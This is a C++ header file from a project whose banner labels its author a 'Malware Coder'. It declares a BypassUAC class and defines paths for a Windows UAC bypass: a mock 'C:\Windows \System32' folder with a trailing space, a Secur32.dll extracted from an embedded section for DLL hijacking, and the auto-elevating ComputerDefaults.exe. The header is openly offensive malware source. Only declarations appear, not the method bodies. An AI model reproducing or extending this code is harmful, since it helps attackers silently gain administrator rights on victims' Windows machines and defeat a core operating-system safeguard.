/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#ifndef UAC_H
#define UAC_H

#include <iostream>
#include <Windows.h>

#define RtlOffsetToPointer(Module, Pointer) PBYTE(PBYTE(Module) + DWORD(Pointer))
#define MOCK_FOLDER_PATH std::string("C:\\Windows \\System32")
#define BYPASS_UAC_DLL_NAME  std::string("Secur32")
#define DLL_SECTION_INDEX 1
#define SECURE32_PATH std::string("C:\\Windows \\System32\\Secur32.dll")
#define COMPUTERDEFAULTS_PATH std::string("C:\\Windows \\System32\\ComputerDefaults.exe")

class BypassUAC
{
public:

	bool ExtractFileFromSection(PBYTE module_base, const std::string& save_path, const std::string& save_name, const int index_from_the_end);
	
	// Check if Directory is Exists
	bool dirExists(const std::string& dirName_in);

	// Check if File is Exists
	bool FileExists(const std::string& path);

	bool StartBypassUAC();
};

#endif // UAC_H